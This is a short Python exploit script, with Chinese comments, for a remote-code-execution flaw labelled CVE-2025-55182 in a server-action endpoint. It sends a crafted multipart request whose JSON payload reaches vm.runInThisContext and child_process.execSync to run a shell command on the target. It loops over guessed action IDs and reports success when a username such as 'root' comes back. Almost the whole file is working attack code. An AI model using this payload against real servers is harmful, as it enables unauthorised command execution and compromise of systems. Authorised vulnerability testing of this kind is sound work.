#!/usr/bin/env python3
"""
CVE-2025-55182 快速测试脚本
"""
import urllib.request
import urllib.error
import json

TARGET = "http://192.168.0.104:3000/dashboard/tools/cve-demo"

# 可能的 Action IDs
ACTION_IDS = [
    "0d1b4c171bf3f5177ea5f7a9be9407b6",
    "a1b2c3d4e5f6",
    "",
]

def create_payload(command: str = "whoami") -> tuple:
    """创建漏洞利用 payload"""
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    
    evil_payload = json.dumps({
        "id": "vm#runInThisContext",
        "bound": [f'global.process.mainModule.require("child_process").execSync("{command}").toString()']
    })
    
    body = f'--{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1_$ACTION_REF_1"\r\n\r\n'
    body += f'--{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1_$ACTION_1:0"\r\n\r\n'
    body += evil_payload + '\r\n'
    body += f'--{boundary}--\r\n'
    
    return body.encode('utf-8'), boundary

def send_exploit(action_id: str) -> str:
    """发送漏洞利用请求"""
    payload, boundary = create_payload("whoami")
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0',
    }
    
    if action_id:
        headers['Next-Action'] = action_id
    
    try:
        req = urllib.request.Request(TARGET, data=payload, headers=headers, method='POST')
        with urllib.request.urlopen(req, timeout=10) as response:
            return f"✓ Status {response.status}: {response.read().decode('utf-8', errors='ignore')[:200]}"
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore')[:200]
        return f"✗ HTTP {e.code}: {body}"
    except Exception as e:
        return f"✗ Error: {str(e)}"

print("CVE-2025-55182 快速测试")
print("=" * 50)
print(f"目标: {TARGET}\n")

for action_id in ACTION_IDS:
    print(f"Testing Action-ID: '{action_id or '(empty)'}'")
    result = send_exploit(action_id)
    print(f"  {result}\n")

print("\n说明：")
print("如果返回包含用户名（如 'zch' 或 'root'），说明漏洞成功利用。")
print("如果返回 'Connection closed' 或类似错误，需要正确的 Action ID。")

